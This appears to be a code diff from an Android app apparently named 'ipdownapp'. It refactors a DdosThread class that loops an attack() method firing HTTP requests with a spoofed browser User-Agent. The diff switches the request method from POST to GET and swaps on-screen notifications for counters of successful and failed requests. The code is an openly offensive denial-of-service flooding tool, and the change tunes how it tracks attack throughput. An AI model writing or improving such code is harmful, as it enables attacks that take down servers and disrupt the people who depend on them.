@@ -4,6 +4,8 @@ import android.os.Looper;
 import android.os.MessageQueue;
 import android.util.Log;
 
+import com.example.ipdownapp.models.ConsoleStateQueue;
+
 import java.io.InputStream;
 import java.io.OutputStream;
 import java.net.HttpURLConnection;
@@ -13,11 +15,12 @@ import java.util.concurrent.atomic.AtomicBoolean;
 
 public class DdosThread extends Thread{
 
-    public static Notificable notificable;
 
     private static int autoId = 0;
 
     private int id;
+
+    private ConsoleStateQueue colaDatos;
 
     private AtomicBoolean running = new AtomicBoolean(true);
     private String request;
@@ -25,7 +28,8 @@ public class DdosThread extends Thread{
 
     String param = null;
 
-    public DdosThread(){
+    public DdosThread(ConsoleStateQueue colaDatos){
+        this.colaDatos = colaDatos;
         this.id = ++autoId;
     }
 
@@ -46,7 +50,7 @@ public class DdosThread extends Thread{
             try {
                 attack();
             } catch (Exception e) {
-                notificar("Error de peticion");
+                colaDatos.incPeticionesErroneas();
             }
         }
     }
@@ -56,31 +60,20 @@ public class DdosThread extends Thread{
         HttpURLConnection connection = (HttpURLConnection) url.openConnection();
         connection.setDoOutput(true);
         connection.setDoInput(true);
-        connection.setRequestMethod("POST");
+        connection.setRequestMethod("GET");
         connection.setRequestProperty("charset", "utf-8");
         connection.setRequestProperty("Host", "localhost");
         connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0");
         connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
         connection.setRequestProperty("Content-Length", param);
 
-        notificar("Reponse code -> "+ connection.getResponseCode());
-
         connection.getInputStream();
 
-    }
-
-
-    private void notificar(String mensaje){
-
-
-        notificable.getActivity().runOnUiThread(new Runnable() {
-            @Override
-            public void run() {
-                notificable.notificar("Thread " + id + ": " + mensaje);
-            }
-        });
-
+        colaDatos.incPeticionesExitosas();
 
     }
+
+
+
 
 }
